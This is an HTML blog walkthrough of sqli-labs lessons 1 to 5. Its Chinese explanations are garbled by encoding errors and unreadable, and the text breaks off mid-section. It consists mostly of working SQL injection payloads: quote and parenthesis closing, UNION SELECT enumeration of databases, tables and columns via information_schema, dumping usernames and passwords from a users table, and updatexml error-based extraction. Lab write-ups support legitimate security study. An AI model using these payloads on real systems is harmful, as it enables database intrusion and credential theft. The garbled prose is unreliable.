title="less-1"></a>less-1</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code></p><p>é—­åˆæ–¹å¼æ˜¯éå¸¸å…³é”®çš„ä¸€æ­¥ï¼Œèƒ½æ­£ç¡®çš„é—­åˆ SQL è¯­å¥ï¼ŒSQL æ³¨å…¥å·¥ä½œç»“æŸä¸€åŠã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1       # å¯ä»¥çœ‹åˆ°ç™»é™†çš„ç”¨æˆ·åå’Œå¯†ç <br>?<span class="hljs-attribute">id</span>=1&#x27;      # SQLæŠ¥é”™ï¼ˆ1<span class="hljs-string">&#x27;&#x27;</span> LIMIT 0,1ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°éƒ¨åˆ† SQL è¯­å¥ï¼ˆè¯´æ˜å­˜åœ¨ SQL æ³¨å…¥ï¼‰ã€‚æŠ¥é”™æ˜¾ç¤º SQL è¯­å¥ä¸­ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·å¯¼è‡´é”™è¯¯ï¼ˆä¼ å‚å¼•å…¥çš„å•å¼•å·+åŸæ¥çš„ SQL è¯­å¥ä¸­åŸæœ‰çš„å•å¼•å·ï¼‰ï¼Œå¯ä»¥åœ¨ä¼ å‚å¼•å…¥çš„å•å¼•å·åæ·»åŠ æ³¨é‡Šç¬¦æ¥æ³¨é‡Šåé¢é‚£ä¸ªå•å¼•å·ï¼‰ã€‚<br>?<span class="hljs-attribute">id</span>=1&#x27;#     # æŠ¥é”™ã€‚åŸå› ï¼šåœ¨URLä¸­GETå¯èƒ½ä½œä¸ºé”šç‚¹,æ— æ³•ä¼ åˆ°åç«¯ã€‚æ‰€ä»¥è¯¥ç”¨--+ï¼Œ--+çš„ä¼ å…¥åç«¯urlè§£ç åæ˜¯-- ï¼ˆæ³¨æ„ç©ºæ ¼ï¼‰ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é‡‡ç”¨%23ï¼ˆæ‰‹åŠ¨urlç¼–ç ï¼‰<br>?<span class="hljs-attribute">id</span>=1&#x27;%23   # æ­£å¸¸å›æ˜¾<br>?<span class="hljs-attribute">id</span>=1&#x27;--+   # æ­£å¸¸å›æ˜¾ï¼ˆSELECT * <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;1&#x27;</span> --+<span class="hljs-string">&#x27; LIMIT 0,1ï¼‰</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦åˆ†æ SQL æ³¨å…¥çš„ SQL å˜åŒ–ï¼Œå¯ä»¥è€ƒè™‘ä¿®æ”¹æºç æ¥è§‚å¯Ÿ SQL è¯­å¥ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/77218F39-FAF6-4918-A148-1FA5C031B27B.png"><br>è¿™é‡Œæœ‰ä¸ªå€¼å¾—æ€è€ƒçš„æµ‹è¯•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>?id=1%23 # SQLè¯­å¥ï¼šSELECT * FROM users WHERE id=&#x27;1#&#x27; LIMIT 0,1<br><br></code></pre></td></tr></table></figure><p>æŒ‰ç…§æ­£å¸¸æ€è·¯ï¼Œåº”è¯¥ä»€ä¹ˆä¹ŸæŸ¥ä¸åˆ°æ‰å¯¹ï¼Œç»“æœå´èƒ½æ­£å¸¸æŸ¥è¯¢id=1ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210114162823.png"><br>æˆ‘ä»¬å¯ä»¥è€ƒè™‘åœ¨ Navicat ä¸­è¿›è¡Œæµ‹è¯•ï¼Œç¡®å®šè¿™ç§æŸ¥è¯¢çœŸå®å­˜åœ¨ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/E4F6DD5A-3000-4D14-BFC8-20E3F2ACEE6E.png"></p><p>ä¸Šé¢è¿™ä¸¤ç§æŸ¥è¯¢çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œéå¸¸å¥‡æ€ªå§ï¼Ÿ</p><p>å’ŒPHPçš„å¼±ç±»å‹ä¸€æ ·ï¼ŒMySQLä¹Ÿæœ‰å¼±ç±»å‹ï¼Œåœ¨é—­åˆ SQL è¯­å¥æ—¶æ˜¯ä¼šç»å¸¸ç”¨åˆ°çš„ã€‚å…·ä½“å¯ä»¥å‚è€ƒä¸‹é¢è¿™ç‰‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/HaHa_Sir/article/details/93666147">MySQL å­—ç¬¦ä¸²ç±»å‹ç”¨æ•°å­—å¯ä»¥æŸ¥å‡ºæ¥ MySQLå­—ç¬¦ä¸²ç±»å‹ä¼šè½¬æ¢æˆæ•°å­— MySQLéšå¼ç±»å‹è½¬æ¢</a>ã€‚</p><p>å¼€å§‹æœé›†æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œå¸¸è§çš„ä¿¡æ¯æœé›†æœ‰ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br><span class="hljs-function"><span class="hljs-title">system_user</span><span class="hljs-params">()</span></span>     ç³»ç»Ÿç”¨æˆ·å<br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span>            MYSQLç”¨æˆ·å <br><span class="hljs-function"><span class="hljs-title">current_user</span><span class="hljs-params">()</span></span>    å½“å‰ç”¨æˆ·å<br><span class="hljs-function"><span class="hljs-title">session_user</span><span class="hljs-params">()</span></span>    è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å<br><span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span>        å½“å‰æ•°æ®åº“å<br><span class="hljs-function"><span class="hljs-title">schema</span><span class="hljs-params">()</span></span>          å½“å‰æ•°æ®åº“å<br><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span>         å½“å‰æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯<br>@@version<br><span class="hljs-function"><span class="hljs-title">load_file</span><span class="hljs-params">()</span></span>       MYSQLè¯»å–æœ¬åœ°æ–‡ä»¶<br><br>@@datadir         Location of DB files<br>@@hostname        æœåŠ¡å™¨ä¸»æœºå<br>@@basedir         MYSQL å®‰è£…è·¯å¾„<br>@@version_compile_os    æ“ä½œç³»ç»Ÿ<br><br></code></pre></td></tr></table></figure><p>ç®€å•çš„æµ‹è¯•ä¸€ä¸‹å¸¸è§çš„ä¿¡æ¯</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># æŸ¥è¯¢æ•°æ®åº“å</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, database(), 3%23<br><br><span class="hljs-comment"># æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, version(), 3%23<br><br><span class="hljs-comment"># æŸ¥è¯¢æ•°æ®åº“ç”¨æˆ·</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, user(), 3%23<br><br><span class="hljs-comment">#æ•°æ®åº“è·¯å¾„</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, @@datadir, 3%23<br><br><span class="hljs-comment"># æ“ä½œç³»ç»Ÿç‰ˆæœ¬</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, @@version_compile_os, 3%23<br><br><span class="hljs-comment"># æŸ¥è¯¢æ‰€æœ‰çš„æ•°æ®åº“å</span><br><span class="hljs-comment"># SELECT GROUP_CONCAT(schema_name) FROM information_schema.SCHEMATA</span><br><span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata%23<br><br><span class="hljs-comment"># æŸ¥è¯¢æŸä¸ªæ•°æ®åº“çš„æ•°æ®è¡¨å</span><br><span class="hljs-comment"># SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() --+<br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> --+<br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=0x7365637572697479 --+ # hexç¼–ç <br><br><span class="hljs-comment"># æŸ¥è¯¢æŸä¸ªæ•°æ®åº“çš„æŸä¸ªè¡¨çš„å­—æ®µå</span><br><span class="hljs-comment"># SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union SELECT 1, 2, GROUP_CONCAT(column_name) <span class="hljs-keyword">FROM</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> --+<br><br><span class="hljs-comment"># æŸ¥è¯¢æ•°æ®è¡¨çš„æ•°æ®</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(id, username, password) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>--+<br><br></code></pre></td></tr></table></figure><p>éœ€è¦æ›´è¿›ä¸€æ­¥çš„å­¦ä¹ æ‰‹å·¥æ³¨å…¥ï¼Œå¯ä»¥å‚è€ƒè¿™ç‰‡æ–‡ç« :<a href="https://www.freebuf.com/articles/web/160352.html">æ–°æ‰‹ç§‘æ™® | MySQLæ‰‹å·¥æ³¨å…¥ä¹‹åŸºæœ¬æ³¨å…¥æµç¨‹</a></p><hr><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=$id</code></p><p>å’Œä¸Šä¸€é¢˜ä¸»è¦æ˜¯é—­åˆæ–¹å¼ä¸åŒã€‚</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br>?id=<span class="hljs-number">1</span>       <span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤º</span><br>?id=<span class="hljs-number">1</span> --+   <span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤º</span><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;      # æ­£å¸¸æ˜¾ç¤º</span><br><span class="hljs-string">?id=1&#x27;</span> --+  <span class="hljs-comment"># é”™è¯¯ï¼ˆå¹¶æ²¡æœ‰çœ‹åˆ°å¼•å·ï¼Œæ•…è¯¥é¢˜çš„é—­åˆæ–¹å¼æ˜¯æ•°å­—å‹ï¼‰</span><br>?id=<span class="hljs-number">0</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2, 3 --+       <span class="hljs-comment"># å›æ˜¾2ï¼Œ3ã€‚è¯´æ˜æ˜¾ç¤ºç¬¬2ä¸ªå­—æ®µå’Œç¬¬3ä¸ªå­—æ®µã€‚</span></span><br><br></code></pre></td></tr></table></figure><p>å’Œ less-1 çš„åŒºåˆ«ï¼šé—­åˆæ–¹å¼ã€‚less-1 æ˜¯å­—ç¬¦ç±»å‹ï¼Œæœ‰å•å¼•å·åŒ…è£¹ã€‚less-2 æ˜¯ int ç±»å‹ï¼Œä¸éœ€è¦å•å¼•å·ã€‚å…¶ä»–æ³¨å…¥è·å–ä¿¡æ¯çš„å§¿åŠ¿æ˜¯ä¸€æ ·çš„ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=$<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=(&#39;$id&#39;)</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1&#x27;<br><span class="hljs-comment"># æŠ¥é”™ä¿¡æ¯ï¼šYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br><span class="hljs-comment"># åœ¨SQLè¯­å¥ä¸­æœ‰å°æ‹¬å·ï¼ˆå¯ä»¥åœ¨æœ¬åœ°å…ˆè¿›è¡Œæµ‹è¯•ï¼‰ã€‚è€ƒè™‘å°†æ‹¬å·è¿›è¡Œé—­åˆ</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27;) --+<br><span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤º</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤º</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># æ²¡æœ‰æ•°æ®</span><br><br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 union select 1,2, 3 --+<br><span class="hljs-comment"># Your Login name:2ï¼ŒYour Password:3ã€‚è¯´æ˜æ˜¾ç¤ºç¬¬2ä¸ªå­—æ®µå’Œç¬¬3ä¸ªå­—æ®µã€‚</span><br><br></code></pre></td></tr></table></figure><p>ç®€å•åˆ†æï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># æœ¬é¢˜ï¼š</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">&#x27;$id&#x27;</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-comment"># å‰ä¸¤é¢˜ï¼š</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=$<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-comment"># å‰ä¸‰ä¸ªéƒ½åªæ˜¯é—­åˆçš„æ–¹å¼ä¸åŒ</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=(&quot;$id&quot;)</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1&quot;<br><span class="hljs-comment"># s You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;1&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br><span class="hljs-comment"># ä¾ç„¶æœ‰æ‹¬å·ï¼Œå°è¯•é—­åˆæ‹¬å·</span><br><br>?<span class="hljs-attribute">id</span>=1&quot;) --+<br><span class="hljs-comment"># æ­£å¸¸è¾“å‡º</span><br><br>?<span class="hljs-attribute">id</span>=1&quot;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># æ­£å¸¸è¾“å‡º</span><br><br>?<span class="hljs-attribute">id</span>=1&quot;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># ä¸æ˜¾ç¤º</span><br><br>?<span class="hljs-attribute">id</span>=0&quot;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 union select 1, 2, 3 --+<br><span class="hljs-comment"># Your Login name:2ï¼ŒYour Password:3ã€‚è¯´æ˜æ˜¾ç¤ºç¬¬2ä¸ªå­—æ®µå’Œç¬¬3ä¸ªå­—æ®µã€‚</span><br><br></code></pre></td></tr></table></figure><p>ç®€å•åˆ†æï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># æœ¬é¢˜ï¼š</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">&quot;$id&quot;</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-comment"># å‰ä¸‰é¢˜ï¼š</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=$<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">&#x27;$id&#x27;</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br><span class="hljs-comment"># é—­åˆæ–¹å¼ä¸åŒ</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code></p><p>å‰é¢ 4 ä¸ª lession éƒ½æ˜¯æœ€åŸºæœ¬çš„æ³¨å…¥å§¿åŠ¿ï¼Œå¹¶ä¸”æ˜¯èƒ½å¤ŸæŸ¥è¯¢å¾—åˆ°è¿”å›ç»“æœçš„ã€‚æŒ‰ç…§<code>å›æ˜¾æ–¹å¼</code>æ¥åˆ†ç±»çš„è¯ï¼Œæˆ‘è®¤ä¸ºå¯ä»¥åˆ†ä¸º 5 ç±»ï¼š</p><ul><li>è”åˆæ³¨å…¥</li><li>æŠ¥é”™æ³¨å…¥</li><li>å¸ƒå°”æ³¨å…¥</li><li>å»¶æ—¶æ³¨å…¥</li><li>å…¶ä»–ï¼ˆDNSlogï¼‰</li></ul><p>æ³¨æ„ï¼šè¿™é‡Œä»…æŒ‰ç…§å›æ˜¾æ–¹å¼åˆ†ç±»ã€‚å¾ˆéš¾åšåˆ°å®Œå…¨ MECE åŸåˆ™ï¼ˆMutually Exclusive, Collectively Exhaustive / ç›¸äº’ç‹¬ç«‹ã€å®Œå…¨ç©·å°½ï¼‰ï¼Œé€šå¸¸æŒ‰ç…§ä¸‹é¢çš„ä¼˜å…ˆåŸåˆ™è¿›è¡Œï¼š</p><blockquote><p>è”åˆæ³¨å…¥&gt;æŠ¥é”™æ³¨å…¥&gt;å¸ƒå°”æ³¨å…¥&gt;å»¶æ—¶æ³¨å…¥&gt;å…¶ä»–ï¼ˆDNSlogï¼‰</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1<br><span class="hljs-comment"># s You are in...........</span><br><span class="hljs-comment"># æ²¡æœ‰ç”¨æˆ·ä¿¡æ¯ã€‚åªèƒ½è€ƒè™‘æŠ¥é”™æ³¨å…¥ã€å¸ƒå°”æ³¨å…¥ã€æ—¶é—´ç›²æ³¨ã€‚</span><br><br>?<span class="hljs-attribute">id</span>=1&quot;<br><span class="hljs-comment"># s You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &quot;1&quot; LIMIT 0,1&#x27; at line 1</span><br><span class="hljs-comment"># é—­åˆå•å¼•å·</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; --+<br><span class="hljs-comment"># æ­£å¸¸è¾“å‡º</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># æ­£å¸¸è¾“å‡º</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># ä¸æ˜¾ç¤º</span><br><br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 union select 1, 2, 3 --+<br><span class="hljs-comment">#  You are in...........ï¼Œæ— æ³•å¾—åˆ°æ•°æ®</span><br><br></code></pre></td></tr></table></figure><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>æ ¹æ®ä¸Šé¢çš„ä¼˜å…ˆçº§ï¼Œæˆ‘ä»¬è€ƒè™‘å…ˆæŠ¥é”™æ³¨å…¥å¼€å§‹æµ‹è¯•</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">id</span>=<span class="hljs-number">0</span>&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">0</span> union select updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select @@version),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>); --+<br><span class="hljs-comment"># s XPATH syntax error: &#x27;~8.0.19~&#x27;</span><br><span class="hljs-comment"># å°† select @@version è¿›è¡Œä¿®æ”¹å³å¯æŸ¥è¯¢å…¶ä»–çš„æ•°æ®ã€‚</span><br><br></code></pre></td></tr></table></figure><p>åŸç†ï¼šMySQLåœ¨æ‰§è¡ŒSQLè¯­å¥æ—¶ï¼ŒæŸäº›å‡½æ•°ä¼šå°†å­æŸ¥è¯¢çš„ç»“æœæ˜¾ç¤ºåœ¨æŠ¥é”™ä¿¡æ¯ä¸­ã€‚æ›´å¤šçš„æŠ¥é”™æ³¨å…¥å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/253?spm=5176.12901015.0.i12901015.322c525cGjiCkg&accounttraceid=0e789a5d27b94462a64cd6d053faaab4tmnn#toc-1">å…ˆçŸ¥ç¤¾åŒº-MYSQLæŠ¥é”™æ³¨å…¥çš„ä¸€ç‚¹æ€»ç»“</a></p><hr><h3 id="å¸ƒå°”æ³¨å…¥"><a href="#å¸ƒå°”æ³¨å…¥" class="headerlink" title="å¸ƒå°”æ³¨å…¥"></a>å¸ƒå°”æ³¨å…¥</h3><p>å°è¯•ä½¿ç”¨<strong>å¸ƒå°”æ³¨å…¥</strong>è¿›è¡Œæµ‹è¯•ï¼Œå¸ƒå°”æ³¨å…¥ä¼šç¨å¾®æ¯”è¾ƒå¤æ‚ï¼Œä¸è¿‡åŸºæœ¬åŸç†ä¸ç®—å¤æ‚ã€‚</p><blockquote><p>åŸºæœ¬åŸç†ï¼šç”¨trueä¸falseå»ä¸€ç‚¹ç‚¹ç¡®å®šä¿¡æ¯ï¼Œæ±‡æ€»ä¹‹åå°±èƒ½å¾—åˆ°æ•´ä¸ªæ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚ï¼š</p><ul><li>é—®ï¼šæ•°æ®åº“åé•¿åº¦å¤§äº8ï¼Ÿ</li><li>ç­”ï¼šfalse</li><li>é—®ï¼šæ•°æ®åº“åé•¿åº¦å°äº8ï¼Ÿ</li><li>ç­”ï¼šfalseï¼ˆå¯ä»¥ç¡®å®šæ•°æ®åº“çš„é•¿åº¦ä¸º8ï¼‰</li><li>é—®ï¼šæ•°æ®åº“ç¬¬ä¸€ä¸ªé¦–å­—æ¯æ˜¯sï¼Ÿ</li><li>ç­”ï¼šæ˜¯</li></ul></blockquote><p>ç®€å•éªŒè¯æ˜¯å¦èƒ½è¿›è¡Œå¸ƒå°”æ³¨å…¥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤º</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># 